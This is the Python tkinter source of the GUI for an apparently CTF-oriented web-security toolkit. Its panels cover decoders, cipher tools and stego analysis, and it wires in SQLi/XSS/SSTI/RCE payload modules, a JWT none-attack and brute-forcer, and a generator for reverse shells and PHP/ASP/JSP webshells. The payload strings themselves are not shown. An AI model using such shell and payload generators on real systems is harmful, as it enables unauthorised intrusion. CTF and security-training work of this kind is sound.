# -*- coding: utf-8 -*-
"""Yang-Web 图形界面 (tkinter).



零外部依赖，Python 自带 tkinter。

布局: 左侧功能树 + 右侧内容区，Tab 式切换。

"""

import tkinter as tk

from tkinter import ttk, scrolledtext, messagebox

import sys

import os



# 导入核心模块

from .core.decoder import (chain_decode, brute_decode, detect_encoding, DECODERS,

    decode_base64, decode_base32, decode_base16, decode_base58, decode_base85,

    decode_url, decode_html, decode_rot13, decode_binary, decode_octal,

    decode_decimal, decode_morse, decode_unicode_escape,
    decode_base91, decode_base92, decode_rot47, decode_shellcode,
    decode_brainfuck, decode_ook, decode_quoted_printable,
    decode_uuencode, decode_xxencode, decode_utf7, decode_punycode,
    _decode_buddha, core_values_decode, beast_decode,
    bear_decode, surnames_decode, telegraph_decode)

from .core.hashid import identify as hash_identify

from .core.jwt import decode_jwt, analyze_jwt, none_attack, brute_jwt, BUILTIN_WORDLIST

from .core.misc_crypto import (

    CIPHER_TYPES, list_ciphers, search_ciphers, get_cipher,

    get_image_path, get_image2_path, get_text_content, get_categories,

    encode as mc_encode, decode as mc_decode,

)

from .payloads import ssti, sqli, lfi, ssrf, xss, php, upload



try:

    from .payloads.rce import RCE_CMD, RCE_BYPASS

except Exception:

    RCE_CMD = {}

    RCE_BYPASS = {}

# ★ v2.0 新引擎导入
try:
    from .core.advanced_engines import ADVANCED_ENCODERS as ADV_ENC
except ImportError:
    ADV_ENC = {}

try:
    from .core.chinese_ciphers import CHINESE_CIPHERS as CHN_CIPHERS
except ImportError:
    CHN_CIPHERS = {}

try:
    from .core.crypto_engine import (
        aes_string_encrypt, aes_string_decrypt,
        rc4_encrypt, rc4_decrypt,
        calc_md5, calc_sha1, calc_sha256, calc_sha512, calc_crc32_hex,
        xor_encrypt, xor_decrypt, xor_brute_single,
        num_base_convert, text_to_hex, hex_to_text,
    )
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    from .core.shell_stego import (
        generate_reverse_shell, list_shell_languages,
        generate_webshell, list_webshell_types,
        analyze_png, extract_lsb, read_exif,
        analyze_file, identify_cipher_text,
    )
    HAS_STEGO = True
except ImportError:
    HAS_STEGO = False

try:
    from .core.sqli_labs_solver import (
        SQLLabsEngine, LESSON_DB, solve_sqli_labs,
    )
    HAS_SQLI_LABS = True
except ImportError:
    HAS_SQLI_LABS = False

try:
    from .core.js_challenge_solver import JSChallengeSolver, solve_js_challenge
    HAS_JS_SOLVER = True
except ImportError:
    HAS_JS_SOLVER = False






BG = "#1e1e2e"

FG = "#cdd6f4"

ACCENT = "#89b4fa"

GREEN = "#a6e3a1"

RED = "#f38ba8"

YELLOW = "#f9e2af"

DARK = "#181825"

INPUT_BG = "#313244"

BORDER = "#45475a"



# ── 主题 ──



def apply_theme(root):

    root.configure(bg=BG)

    style = ttk.Style()

    style.theme_use("clam")

    style.configure("TNotebook", background=BG, borderwidth=0)

    style.configure("TNotebook.Tab", background=DARK, foreground=FG, padding=[16, 8],

                    borderwidth=0, font=("Microsoft YaHei UI", 10))

    style.map("TNotebook.Tab", background=[("selected", INPUT_BG)], foreground=[("selected", ACCENT)])

    style.configure("TFrame", background=BG)

    style.configure("TLabel", background=BG, foreground=FG, font=("Microsoft YaHei UI", 10))

    style.configure("TButton", background=INPUT_BG, foreground=FG, borderwidth=1,

                    font=("Microsoft YaHei UI", 10))

    style.configure("TLabelframe", background=BG, foreground=ACCENT, borderwidth=1,

                    font=("Microsoft YaHei UI", 10, "bold"))

    style.configure("TLabelframe.Label", background=BG, foreground=ACCENT)

    style.configure("TCombobox", fieldbackground=INPUT_BG, background=INPUT_BG,

                    foreground=FG, selectbackground=ACCENT)



# ── 辅助 ──



def _scrollable_text(parent, height=12, width=80):

    frame = tk.Frame(parent, bg=BG)

    txt = tk.Text(frame, height=height, width=width, bg=INPUT_BG, fg=FG,

                  insertbackground=ACCENT, relief="flat", borderwidth=0,

                  font=("Microsoft YaHei UI", 10), padx=10, pady=8,

                  wrap=tk.WORD)

    scroll = tk.Scrollbar(frame, command=txt.yview)

    txt.configure(yscrollcommand=scroll.set)

    txt.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    scroll.pack(side=tk.RIGHT, fill=tk.Y)

    return frame, txt



def _label(parent, text, fg=FG, font_size=10, bold=False, pady=4):
    try:
        safe_text = str(text).replace('\x00', '')
        w = tk.Label(parent, text=safe_text, bg=BG, fg=fg,
                     font=("Microsoft YaHei UI", font_size, "bold" if bold else "normal"))
        w.pack(anchor="w", pady=(int(pady), 0))
        return w
    except Exception:
        # Last-resort: plain Label
        w = tk.Label(parent, text=str(text)[:200], bg=BG, fg=RED)
        w.pack(anchor="w")
        return w



def _button(parent, text, command, accent=False, width=None):

    bg = ACCENT if accent else INPUT_BG

    fg = DARK if accent else FG

    btn = tk.Button(parent, text=text, command=command, bg=bg, fg=fg,

                    activebackground=BORDER, activeforeground=FG, relief="flat",

                    borderwidth=0, padx=16, pady=6, cursor="hand2",

                    font=("Microsoft YaHei UI", 10, "bold" if accent else "normal"))

    if width:

        btn.configure(width=width)

    btn.pack(anchor="w", pady=2)

    return btn



def _entry(parent, width=60):

    e = tk.Entry(parent, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                 relief="flat", borderwidth=0, font=("Cascadia Code", 11),

                 width=width)

    e.pack(fill=tk.X, pady=(2, 6), ipady=4)

    return e



def _combo(parent, values, default=None, **kw):

    cb = ttk.Combobox(parent, values=values, state="readonly",

                      font=("Cascadia Code", 10), **kw)

    if default:

        cb.set(default)

    cb.pack(fill=tk.X, pady=(2, 6))

    return cb



def _output_area(parent, height=18):

    """返回 (frame, text_widget) 方便需要自定义配置."""

    return _scrollable_text(parent, height=height)



def _append(txt_widget, text, tag=None):

    txt_widget.configure(state="normal")

    if not text.endswith('\n'):

        text = text + '\n'

    txt_widget.insert(tk.END, text)

    txt_widget.configure(state="disabled")

    txt_widget.see(tk.END)



def _clear_output(txt_widget):

    txt_widget.configure(state="normal")

    txt_widget.delete("1.0", tk.END)

    txt_widget.configure(state="disabled")





# ═══════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════
#  v2.0 新面板: 高级编码
# ═══════════════════════════════════════════════════════════

class AdvancedEncodePanel(tk.Frame):
    """高级编码面板 —— 20+ 种编码/密码类型."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "高级编码器", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "Brainfuck | Ook | JSFuck | QP | Base91/92 | ROT47/5/18/8000 | Punycode | Zero-width 等 20+ 种",
               fg=YELLOW, font_size=9)

        top = tk.Frame(self, bg=BG)
        top.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(top, text="分类:", bg=BG, fg=ACCENT).pack(side=tk.LEFT, padx=(0, 4))
        cats = list(set(info['category'] for info in ADV_ENC.values())) if ADV_ENC else ['无']
        self.cat_var = tk.StringVar(value=cats[0] if cats else '')
        self.cat_cb = ttk.Combobox(top, textvariable=self.cat_var, values=cats,
                                    state="readonly", width=18)
        self.cat_cb.pack(side=tk.LEFT, padx=2)
        self.cat_cb.bind("<<ComboboxSelected>>", self._on_cat)

        tk.Label(top, text="编码:", bg=BG, fg=ACCENT).pack(side=tk.LEFT, padx=(12, 4))
        self.enc_var = tk.StringVar(value="")
        self.enc_cb = ttk.Combobox(top, textvariable=self.enc_var, values=[],
                                    state="readonly", width=22)
        self.enc_cb.pack(side=tk.LEFT, padx=2)
        self.enc_cb.bind("<<ComboboxSelected>>", self._on_enc)

        _label(self, "输入:", pady=4)
        self.input_text = scrolledtext.ScrolledText(self, height=4, bg=INPUT_BG, fg=FG,
            insertbackground=ACCENT, relief="flat", font=("Cascadia Code", 11), wrap=tk.WORD)
        self.input_text.pack(fill=tk.X, padx=4, pady=(0, 4))

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(anchor="w", padx=4, pady=4)
        tk.Button(btn_frame, text="Encode", command=self._encode, bg=ACCENT, fg=DARK,
            relief="flat", padx=16, pady=5, cursor="hand2",
            font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(btn_frame, text="Decode", command=self._decode, bg=GREEN, fg=DARK,
            relief="flat", padx=16, pady=5, cursor="hand2",
            font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(btn_frame, text="Clear", command=self._clear, bg=RED, fg=DARK,
            relief="flat", padx=16, pady=5, cursor="hand2",
            font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)

        self.desc_label = tk.Label(self, text="", bg=BG, fg=YELLOW,
            font=("Microsoft YaHei UI", 9), anchor="w", justify="left")
        self.desc_label.pack(fill=tk.X, padx=4, pady=2)

        _label(self, "结果:", pady=4)
        self.output_frame, self.output = _output_area(self, 14)
        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

        self._current_eid = None
        self._populate_encs()

    def _populate_encs(self):
        cat = self.cat_var.get()
        if not ADV_ENC:
            return
        names = []
        for eid, info in ADV_ENC.items():
            if cat and info['category'] != cat:
                continue
            names.append(info['name'] + ' (' + eid + ')')
        self.enc_cb['values'] = names
        if names:
            self.enc_cb.set(names[0])
            self._on_enc()

    def _on_cat(self, event=None):
        self._populate_encs()

    def _on_enc(self, event=None):
        sel = self.enc_cb.get()
        if '(' in sel:
            eid = sel.split('(')[-1].rstrip(')')
            info = ADV_ENC.get(eid, {})
            self.desc_label.config(text=info.get('desc', ''))
            self._current_eid = eid

    def _encode(self):
        _clear_output(self.output)
        text = self.input_text.get("1.0", tk.END).strip()
        if not text:
            _append(self.output, "请先输入文本")
            return
        eid = getattr(self, '_current_eid', None)
        if not eid or eid not in ADV_ENC:
            _append(self.output, "请选择编码类型")
            return
        try:
            name = ADV_ENC[eid]['name']
            result = ADV_ENC[eid]['encode'](text)
            _append(self.output, "=== " + name + " Encode ===\n" + "-" * 50 + "\n" + result)
        except Exception as e:
            _append(self.output, "Error: " + str(e))

    def _decode(self):
        _clear_output(self.output)
        text = self.input_text.get("1.0", tk.END).strip()
        if not text:
            _append(self.output, "请先输入文本")
            return
        eid = getattr(self, '_current_eid', None)
        if not eid or eid not in ADV_ENC:
            _append(self.output, "请选择编码类型")
            return
        try:
            name = ADV_ENC[eid]['name']
            result = ADV_ENC[eid]['decode'](text)
            _append(self.output, "=== " + name + " Decode ===\n" + "-" * 50 + "\n" + result)
        except Exception as e:
            _append(self.output, "Error: " + str(e))

    def _clear(self):
        self.input_text.delete("1.0", tk.END)
        _clear_output(self.output)


# ═══════════════════════════════════════════════════════════
#  v2.0 新面板: 中文特色密码
# ═══════════════════════════════════════════════════════════

class ChineseCipherPanel(tk.Frame):
    """中文特色密码面板."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "中文特色密码", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "与佛论禅 | 核心价值观 | 兽音 | 熊曰 | 百家姓 | 中文电码",
               fg=YELLOW, font_size=9)

        tk.Label(self, text="密码类型:", bg=BG, fg=ACCENT).pack(anchor="w", padx=4, pady=2)
        names = [v['name'] + ' (' + k + ')' for k, v in CHN_CIPHERS.items()] if CHN_CIPHERS else []
        self.cipher_var = tk.StringVar(value=names[0] if names else "")
        self.cipher_cb = ttk.Combobox(self, textvariable=self.cipher_var, values=names,
                                       state="readonly", width=30)
        self.cipher_cb.pack(anchor="w", padx=4, pady=2)

        _label(self, "输入:", pady=4)
        self.input_text = scrolledtext.ScrolledText(self, height=4, bg=INPUT_BG, fg=FG,
            insertbackground=ACCENT, relief="flat", font=("Cascadia Code", 11), wrap=tk.WORD)
        self.input_text.pack(fill=tk.X, padx=4, pady=(0, 4))

        btn_frame = tk.Frame(self, bg=BG)
        btn_frame.pack(anchor="w", padx=4, pady=4)
        tk.Button(btn_frame, text="Encode", command=self._enc, bg=ACCENT, fg=DARK,
            relief="flat", padx=16, pady=5, cursor="hand2",
            font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(btn_frame, text="Decode", command=self._dec, bg=GREEN, fg=DARK,
            relief="flat", padx=16, pady=5, cursor="hand2",
            font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT)

        self.desc_label = tk.Label(self, text="", bg=BG, fg=YELLOW,
            font=("Microsoft YaHei UI", 9), anchor="w")
        self.desc_label.pack(fill=tk.X, padx=4, pady=2)

        _label(self, "结果:", pady=4)
        self.output_frame, self.output = _output_area(self, 14)
        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

    def _get_cid(self):
        sel = self.cipher_var.get()
        return sel.split('(')[-1].rstrip(')') if '(' in sel else None

    def _enc(self):
        _clear_output(self.output)
        text = self.input_text.get("1.0", tk.END).strip()
        cid = self._get_cid()
        if not cid or cid not in CHN_CIPHERS:
            return
        info = CHN_CIPHERS[cid]
        self.desc_label.config(text=info['desc'])
        try:
            r = info['encode'](text)
            _append(self.output, "=== " + info['name'] + " Encode ===\n" + "-" * 50 + "\n" + r)
        except Exception as e:
            _append(self.output, "Error: " + str(e))

    def _dec(self):
        _clear_output(self.output)
        text = self.input_text.get("1.0", tk.END).strip()
        cid = self._get_cid()
        if not cid or cid not in CHN_CIPHERS:
            return
        info = CHN_CIPHERS[cid]
        try:
            r = info['decode'](text)
            _append(self.output, "=== " + info['name'] + " Decode ===\n" + "-" * 50 + "\n" + r)
        except Exception as e:
            _append(self.output, "Error: " + str(e))


# ═══════════════════════════════════════════════════════════
#  v2.0 新面板: 加解密引擎
# ═══════════════════════════════════════════════════════════

class CryptoPanel(tk.Frame):
    """AES/RC4/XOR/Hash 引擎面板."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "加解密引擎", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "AES(ECB/CBC) | RC4 | XOR | MD5/SHA256/SHA512 | CRC32 | Hex转换 | XOR爆破",
               fg=YELLOW, font_size=9)

        top = tk.Frame(self, bg=BG)
        top.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(top, text="功能:", bg=BG, fg=ACCENT).pack(side=tk.LEFT, padx=(0, 4))
        funcs = [
            "AES Encrypt (ECB)", "AES Decrypt (ECB)", "AES Encrypt (CBC)", "AES Decrypt (CBC)",
            "RC4 Encrypt", "RC4 Decrypt",
            "XOR Encrypt", "XOR Decrypt", "XOR Single-Byte Brute",
            "MD5", "SHA-1", "SHA-256", "SHA-512", "CRC32",
            "Text->Hex", "Hex->Text", "Base Convert",
        ]
        self.func_var = tk.StringVar(value=funcs[0])
        self.func_cb = ttk.Combobox(top, textvariable=self.func_var, values=funcs,
                                     state="readonly", width=22)
        self.func_cb.pack(side=tk.LEFT, padx=2)

        key_frame = tk.Frame(self, bg=BG)
        key_frame.pack(fill=tk.X, padx=4, pady=2)
        tk.Label(key_frame, text="Key/IV:", bg=BG, fg=YELLOW).pack(side=tk.LEFT, padx=(0, 4))
        self.key_entry = tk.Entry(key_frame, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
            relief="flat", font=("Cascadia Code", 11), width=40)
        self.key_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        _label(self, "输入:", pady=4)
        self.input_text = scrolledtext.ScrolledText(self, height=5, bg=INPUT_BG, fg=FG,
            insertbackground=ACCENT, relief="flat", font=("Cascadia Code", 11), wrap=tk.WORD)
        self.input_text.pack(fill=tk.X, padx=4, pady=(0, 4))

        tk.Button(self, text="Execute", command=self._run, bg=ACCENT, fg=DARK,
            relief="flat", padx=20, pady=6, cursor="hand2",
            font=("Microsoft YaHei UI", 11, "bold")).pack(anchor="w", padx=4, pady=4)

        _label(self, "结果:", pady=4)
        self.output_frame, self.output = _output_area(self, 14)
        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

    def _run(self):
        _clear_output(self.output)
        text = self.input_text.get("1.0", tk.END).strip()
        key = self.key_entry.get().strip()
        func = self.func_var.get()

        if not HAS_CRYPTO:
            _append(self.output, "加解密引擎未加载")
            return

        try:
            sep = "\n" + "-" * 50 + "\n"
            if func == "AES Encrypt (ECB)":
                k = key if key else "0123456789abcdef"
                r = aes_string_encrypt(text, k, "ecb")
                _append(self.output, "AES-ECB Encrypt, key=" + k + sep + r)
            elif func == "AES Decrypt (ECB)":
                k = key if key else "0123456789abcdef"
                r = aes_string_decrypt(text, k, "ecb")
                _append(self.output, "AES-ECB Decrypt" + sep + r)
            elif func == "AES Encrypt (CBC)":
                k = key if key else "0123456789abcdef"
                r = aes_string_encrypt(text, k, "cbc", key[:16] if key else "")
                _append(self.output, "AES-CBC Encrypt" + sep + r)
            elif func == "AES Decrypt (CBC)":
                k = key if key else "0123456789abcdef"
                r = aes_string_decrypt(text, k, "cbc", key[:16] if key else "")
                _append(self.output, "AES-CBC Decrypt" + sep + r)
            elif func == "RC4 Encrypt":
                r = rc4_encrypt(text, key)
                _append(self.output, "RC4 Encrypt, key=" + key + sep + r)
            elif func == "RC4 Decrypt":
                r = rc4_decrypt(text, key)
                _append(self.output, "RC4 Decrypt" + sep + r)
            elif func == "XOR Encrypt":
                r = xor_encrypt(text, key)
                _append(self.output, "XOR Encrypt, key=" + key + sep + r)
            elif func == "XOR Decrypt":
                r = xor_decrypt(text, key)
                _append(self.output, "XOR Decrypt" + sep + r)
            elif func == "XOR Single-Byte Brute":
                results = xor_brute_single(text)
                lines = ["XOR Single-Byte Brute (" + str(len(results)) + " readable results):", "-" * 50]
                for k, plain in results[:10]:
                    c = chr(k) if 32 <= k < 127 else '?'
                    lines.append("  key=0x" + format(k, '02X') + " ('" + c + "'): " + plain[:100])
                _append(self.output, "\n".join(lines))
            elif func == "MD5":
                _append(self.output, "MD5: " + calc_md5(text))
            elif func == "SHA-1":
                _append(self.output, "SHA-1: " + calc_sha1(text))
            elif func == "SHA-256":
                _append(self.output, "SHA-256: " + calc_sha256(text))
            elif func == "SHA-512":
                _append(self.output, "SHA-512: " + calc_sha512(text))
            elif func == "CRC32":
                _append(self.output, "CRC32: " + calc_crc32_hex(text))
            elif func == "Text->Hex":
                _append(self.output, "Hex: " + text_to_hex(text))
            elif func == "Hex->Text":
                _append(self.output, "Text: " + hex_to_text(text))
            elif func == "Base Convert":
                parts = text.split()
                if len(parts) >= 3 and parts[0].isdigit() and parts[1].isdigit():
                    from_base = int(parts[0])
                    to_base = int(parts[1])
                    val = parts[2]
                    r = num_base_convert(val, from_base, to_base)
                    _append(self.output, "Base" + str(from_base) + " -> Base" + str(to_base) + ":\n" + r)
                else:
                    _append(self.output, "Format: <from_base> <to_base> <value>\nExample: 16 10 FF")
        except Exception as e:
            _append(self.output, "Error: " + str(e))


# ═══════════════════════════════════════════════════════════
#  v2.0 新面板: Shell 生成器
# ═══════════════════════════════════════════════════════════

class ShellPanel(tk.Frame):
    """Reverse Shell & WebShell 生成器."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "Shell 生成器", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "反弹Shell (12种语言) | WebShell (PHP/ASP/JSP/Node.js)", fg=YELLOW, font_size=9)

        rev_frame = tk.LabelFrame(self, text=" 反弹Shell ", bg=BG, fg=ACCENT,
                                   font=("Microsoft YaHei UI", 11))
        rev_frame.pack(fill=tk.X, padx=4, pady=4)

        row1 = tk.Frame(rev_frame, bg=BG)
        row1.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(row1, text="语言:", bg=BG, fg=ACCENT).pack(side=tk.LEFT)
        self.shell_lang = ttk.Combobox(row1,
            values=list_shell_languages() if HAS_STEGO else [], state="readonly", width=12)
        self.shell_lang.pack(side=tk.LEFT, padx=4)
        if HAS_STEGO and list_shell_languages():
            self.shell_lang.set(list_shell_languages()[0])
        tk.Label(row1, text="IP:", bg=BG, fg=ACCENT).pack(side=tk.LEFT, padx=(8, 0))
        self.shell_ip = tk.Entry(row1, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
            relief="flat", font=("Cascadia Code", 10), width=18)
        self.shell_ip.pack(side=tk.LEFT, padx=4)
        self.shell_ip.insert(0, "10.0.0.1")
        tk.Label(row1, text="Port:", bg=BG, fg=ACCENT).pack(side=tk.LEFT, padx=(8, 0))
        self.shell_port = tk.Entry(row1, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
            relief="flat", font=("Cascadia Code", 10), width=7)
        self.shell_port.pack(side=tk.LEFT, padx=4)
        self.shell_port.insert(0, "4444")
        tk.Button(row1, text="Generate", command=self._gen_rev, bg=GREEN, fg=DARK,
            relief="flat", padx=12, pady=3, cursor="hand2",
            font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=(8, 0))

        ws_frame = tk.LabelFrame(self, text=" WebShell ", bg=BG, fg=ACCENT,
                                  font=("Microsoft YaHei UI", 11))
        ws_frame.pack(fill=tk.X, padx=4, pady=4)

        ws_row = tk.Frame(ws_frame, bg=BG)
        ws_row.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(ws_row, text="类型:", bg=BG, fg=ACCENT).pack(side=tk.LEFT)
        ws_types = list_webshell_types() if HAS_STEGO else []
        self.ws_type = ttk.Combobox(ws_row, values=ws_types, state="readonly", width=20)
        self.ws_type.pack(side=tk.LEFT, padx=4)
        if ws_types:
            self.ws_type.set(ws_types[0])
        tk.Button(ws_row, text="Generate", command=self._gen_ws, bg=GREEN, fg=DARK,
            relief="flat", padx=12, pady=3, cursor="hand2",
            font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=(8, 0))

        _label(self, "输出:", pady=4)
        self.output_frame, self.output = _output_area(self, 18)
        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

    def _gen_rev(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "Shell 生成器未加载"); return
        lang = self.shell_lang.get()
        ip = self.shell_ip.get().strip()
        port_str = self.shell_port.get().strip()
        if not lang or not ip or not port_str:
            _append(self.output, "请填写语言/IP/端口"); return
        try:
            port = int(port_str)
        except ValueError:
            _append(self.output, "端口必须是数字"); return
        r = generate_reverse_shell(lang, ip, port)
        _append(self.output, r)

    def _gen_ws(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "Shell 生成器未加载"); return
        ws = self.ws_type.get()
        if not ws:
            _append(self.output, "请选择WebShell类型"); return
        r = generate_webshell(ws)
        _append(self.output, r)


# ═══════════════════════════════════════════════════════════
#  v2.0 新面板: 隐写 & 文件分析
# ═══════════════════════════════════════════════════════════

class StegoPanel(tk.Frame):
    """隐写 & 文件分析面板."""
    def __init__(self, parent):
        super().__init__(parent, bg=BG)
        _label(self, "隐写 & 文件分析", fg=ACCENT, font_size=16, bold=True, pady=8)
        _label(self, "PNG分析 | LSB提取 | EXIF | 文件头识别 | 密文特征检测",
               fg=YELLOW, font_size=9)

        file_frame = tk.Frame(self, bg=DARK)
        file_frame.pack(fill=tk.X, padx=4, pady=4)
        tk.Label(file_frame, text="文件路径:", bg=DARK, fg=ACCENT,
            font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT, padx=6, pady=6)
        self.file_path = tk.Entry(file_frame, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,
            relief="flat", font=("Cascadia Code", 10))
        self.file_path.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        btn_row = tk.Frame(self, bg=BG)
        btn_row.pack(anchor="w", padx=4, pady=4)
        for lbl, cmd in [
            ("PNG分析", self._png), ("LSB提取", self._lsb),
            ("EXIF", self._exif), ("文件分析", self._file_analyze),
        ]:
            tk.Button(btn_row, text=lbl, command=cmd, bg=INPUT_BG, fg=FG,
                relief="flat", padx=10, pady=4, cursor="hand2",
                font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)

        ident_frame = tk.LabelFrame(self, text=" 密文特征识别 ", bg=BG, fg=ACCENT)
        ident_frame.pack(fill=tk.X, padx=4, pady=4)
        _label(ident_frame, "粘贴密文自动识别:", pady=2)
        self.ident_text = scrolledtext.ScrolledText(ident_frame, height=3, bg=INPUT_BG, fg=FG,
            insertbackground=ACCENT, relief="flat", font=("Cascadia Code", 11), wrap=tk.WORD)
        self.ident_text.pack(fill=tk.X, padx=4, pady=(0, 4))
        tk.Button(ident_frame, text="识别", command=self._identify, bg=ACCENT, fg=DARK,
            relief="flat", padx=12, pady=3, cursor="hand2",
            font=("Microsoft YaHei UI", 9, "bold")).pack(anchor="w", padx=4, pady=(0, 4))

        _label(self, "结果:", pady=4)
        self.output_frame, self.output = _output_area(self, 16)
        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))

    def _get_path(self):
        return self.file_path.get().strip()

    def _png(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "分析引擎未加载"); return
        _append(self.output, analyze_png(self._get_path()))

    def _lsb(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "分析引擎未加载"); return
        _append(self.output, extract_lsb(self._get_path()))

    def _exif(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "分析引擎未加载"); return
        _append(self.output, read_exif(self._get_path()))

    def _file_analyze(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "分析引擎未加载"); return
        _append(self.output, analyze_file(self._get_path()))

    def _identify(self):
        _clear_output(self.output)
        if not HAS_STEGO:
            _append(self.output, "分析引擎未加载"); return
        text = self.ident_text.get("1.0", tk.END).strip()
        if not text:
            _append(self.output, "请先粘贴密文"); return
        _append(self.output, identify_cipher_text(text))

#  各功能面板

# ═══════════════════════════════════════════════════════════



class DecodePanel(tk.Frame):

    """智能解码面板 — 粘贴即用，自动识别+一键解码."""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "🔓 智能解码器", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "粘贴密文 → 自动识别编码类型 → 一键解码 | 支持 28+ 种编码", fg=YELLOW, font_size=9)



        # ── Input area ──

        input_frame = tk.Frame(self, bg=DARK, bd=2, relief="groove")

        input_frame.pack(fill=tk.X, padx=4, pady=(8, 4))

        _label(input_frame, "📥 粘贴密文到这里:", fg=ACCENT, font_size=10, pady=2)

        self.input_text = scrolledtext.ScrolledText(input_frame, height=5,

                                                     bg=INPUT_BG, fg=FG,

                                                     insertbackground=ACCENT,

                                                     relief="flat", borderwidth=0,

                                                     font=("Cascadia Code", 11),

                                                     wrap=tk.WORD)

        self.input_text.pack(fill=tk.X, padx=6, pady=(0, 6))



        # ── Action buttons ──

        btn_frame = tk.Frame(self, bg=BG)

        btn_frame.pack(anchor="w", pady=4, padx=4)

        tk.Button(btn_frame, text="🔍 识别编码", command=self._detect,

                  bg=ACCENT, fg=DARK, activebackground=GREEN, relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))

        tk.Button(btn_frame, text="💣 暴力全部", command=self._brute,

                  bg=YELLOW, fg=DARK, activebackground=ACCENT, relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))

        tk.Button(btn_frame, text="🔗 链式解码", command=self._chain,

                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(0, 6))

        tk.Button(btn_frame, text="🗑 清空", command=self._clear_all,

                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)



        # ── Detection result + quick-decode buttons (shown after detect) ──

        self.detect_frame = tk.Frame(self, bg=BG)

        self.detect_frame.pack(fill=tk.X, padx=4, pady=2)

        self.detect_label = tk.Label(self.detect_frame, text="", bg=BG, fg=YELLOW,

                                      font=("Microsoft YaHei UI", 9, "bold"),

                                      anchor="w", justify="left")

        self.detect_label.pack(anchor="w")

        self.detect_btns = tk.Frame(self.detect_frame, bg=BG)

        self.detect_btns.pack(anchor="w", pady=2)



        # ── Manual picker ──

        manual_bar = tk.Frame(self, bg=BG)

        manual_bar.pack(fill=tk.X, padx=4, pady=2)

        tk.Label(manual_bar, text="手动选择:", bg=BG, fg=FG,

                 font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=(0, 4))

        manual_opts = ["base64", "base32", "base16/hex", "url", "html", "unicode",

                       "binary", "octal", "decimal", "rot13", "rot47", "morse", "base58", "base85","rot47", "morse", "base58", "base85",
                       "buddha", "core_values", "beast", "bear", "surnames", "telegraph",
                       "base91", "base92", "shellcode", "brainfuck", "ook",
                       "quoted_printable", "uuencode", "xxencode", "utf7", "punycode"]

        self.manual_var = tk.StringVar(value="base64")

        self.manual_cb = ttk.Combobox(manual_bar, textvariable=self.manual_var,

                                       values=manual_opts, state="readonly", width=14)

        self.manual_cb.pack(side=tk.LEFT, padx=2)

        tk.Button(manual_bar, text="Decode", command=self._manual_decode,

                  bg=INPUT_BG, fg=ACCENT, activebackground=BORDER, relief="flat",

                  padx=12, pady=2, cursor="hand2",

                  font=("Microsoft YaHei UI", 9, "bold")).pack(side=tk.LEFT, padx=2)



        # ── Output ──

        _label(self, "📤 解码结果:", pady=8)

        self.output_frame, self.output = _output_area(self, 12)

        self.output_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=(0, 4))



    def _get_text(self):

        return self.input_text.get("1.0", tk.END).strip()



    def _clear_all(self):

        self.input_text.delete("1.0", tk.END)

        _clear_output(self.output)

